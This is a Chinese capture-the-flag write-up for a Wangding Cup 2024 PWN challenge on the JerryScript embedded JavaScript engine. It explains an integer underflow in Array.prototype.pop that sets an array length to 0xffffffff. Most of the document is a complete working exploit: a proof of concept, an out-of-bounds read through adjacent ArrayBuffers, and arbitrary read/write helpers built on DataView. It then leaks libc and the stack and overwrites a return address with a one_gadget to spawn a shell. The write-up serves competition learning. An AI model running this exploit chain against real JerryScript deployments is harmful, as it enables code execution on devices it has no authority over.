---
title: 网鼎杯青龙组 PWN03 JerryScript Array Pop 整数下溢
contest: 网鼎杯
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [JerryScript, ECMAScript, Array-POP, integer-underflow, ArrayBuffer, DataView, OOB-read, OOB-write, aar-aaw, GOT-overwrite, one_gadget]
attack_chain:
  - 编译 jerryscript commit d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
  - 定位 ecma_builtin_array_prototype_object_pop 触发 length = 0xffffffff 整数下溢
  - 创建 ArrayBuffer + DataView 配合 pop 实现相对越界读写
  - 关键 PoC：let a=[1,1,1,1,1,1,1,1]; a.pop(); print(a.length)  // 4294967295=0xffffffff
  - 进一步 a[242] 读取 OOB 拿到相邻 ArrayBuffer 指针
  - 写 aar(addr, dv1, dv2): dv1.setBigUint64(0, addr) + dv2.getBigUint64(0) 任意地址读
  - 写 aaw(addr, value, dv1, dv2): setBigUint64 任意地址写
  - 通过 a[242] 泄 elf_base = buffer_p - 0x26db80
  - free_got = aar(elf_base + 0x26adf8) → libc_base = free_got - 0x97910
  - environ → stack 泄 __libc_start_main_ret
  - aaw(libc_start_main_ret, libc_base + 0x10a2fc) 写 one_gadget
  - 触发 aar(environ, d1, d2) 跳到 one_gadget 拿 shell
key_payload: 'let a=[1,1,1,1,1,1,1,1]; a.pop(); a[242] 越界 + ArrayBuffer aar/aaw + one_gadget 0x10a2fc'
one_liner: JerryScript Array.pop() 整数下溢触发 length=0xffffffff，配合 ArrayBuffer 相对越界读写实现 aar/aaw，最终改 __libc_start_main_ret 跳 one_gadget。
lesson: 嵌入式 JS 引擎的 OOB 漏洞可通过 JS 高级抽象（Array/DataView）放大为完整读写原语，绕过 ASLR 改 GOT 拿 shell。
quality: high
---

# 网鼎杯青龙组 PWN03 JerryScript 题目

**来源**: ctfiot.com ID 215340
**目标**: jerryscript commit d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba

## 编译
```bash
git clone https://github.com/jerryscript-project/jerryscript.git
git checkout d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
python3 ./tools/build.py --strip=on
python3 ./tools/build.py --clean --compile-flag=-g --strip=off
```

## 漏洞定位
- `jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c`
- `ecma_builtin_array_prototype_dispatch_routine` → case `ECMA_ARRAY_PROTOTYPE_POP` (id=5)
- `ecma_builtin_array_prototype_object_pop` 函数未做 length 边界检查

## 漏洞 PoC
```js
let a = [1,1,1,1,1,1,1,1]
a.pop()
print(a.length)
// 4294967295 = 0xffffffff
```

## 越界读写
```js
let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];
a1 = new ArrayBuffer(0x1000);
d1 = new DataView(a1);
d1.setUint32(0, 0x41414141, true);
a2 = new ArrayBuffer(0x1000);
d2 = new DataView(a2);
d2.setUint32(0, 0x42424242, true);
a.pop();           // 触发 length 下溢
print(a[242]);     // 越界读相邻 ArrayBuffer 指针（89549968）
```

## 完整利用

```js
function hex(i){return "0x" + i.toString(16).padStart(16,'0');}

function aar(addr, dv1, dv2){
    dv1.setBigUint64(0, addr, true);
    if(dv2.buffer) return dv2.getBigUint64(0, true);
    return 0;
}

function aaw(addr, value, dv1, dv2){
    dv1.setBigUint64(0, addr, true);
    dv2.setBigUint64(0, value, true);
}

let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];
a1 = new ArrayBuffer(0x1000);
d1 = new DataView(a1);
d1.setUint32(0, 0x41414141, true);
a2 = new ArrayBuffer(0x1000);
d2 = new DataView(a2);
d2.setUint32(0, 0x42424242, true);
a.pop();

var offset = a[242] - 0x3c;
a[242] = offset;
buffer_p = Number(d1.getBigUint64(0, true));
elf_base = buffer_p - 0x26db80;
print(hex(elf_base));

free_got = Number(aar(elf_base + 0x26adf8, d1, d2));
libc_base = free_got - 0x97910;
environ = libc_base + 0x61c118;
stack = Number(aar(environ, d1, d2));
libc_start_main_ret = stack - 0xf8;

aaw(libc_start_main_ret, libc_base + 0x10a2fc, d1, d2);
aar(environ, d1, d2);
```

## 攻击链
1. `a.pop()` 触发 `length = 0xffffffff`
2. `a[242]` 越界读拿到相邻 ArrayBuffer 内部指针
3. 修改 `a[242] = offset` 让 `d1` 偏移到目标地址
4. 通过 `aar`/`aaw` 实现任意地址读写
5. `free_got` → `libc_base` → `environ` → `__libc_start_main_ret`
6. 改 `__libc_start_main_ret` 为 one_gadget `0x10a2fc`
7. 触发 aar 跳 one_gadget 拿 shell

## 评价
JerryScript 是物联网嵌入式 JS 引擎，本题考察 ECMAScript 引擎内部数据结构的 OOB 漏洞利用。`Array.pop()` 整数下溢是经典 CVE 模式，配合 ArrayBuffer + DataView 高级抽象形成完整利用链。
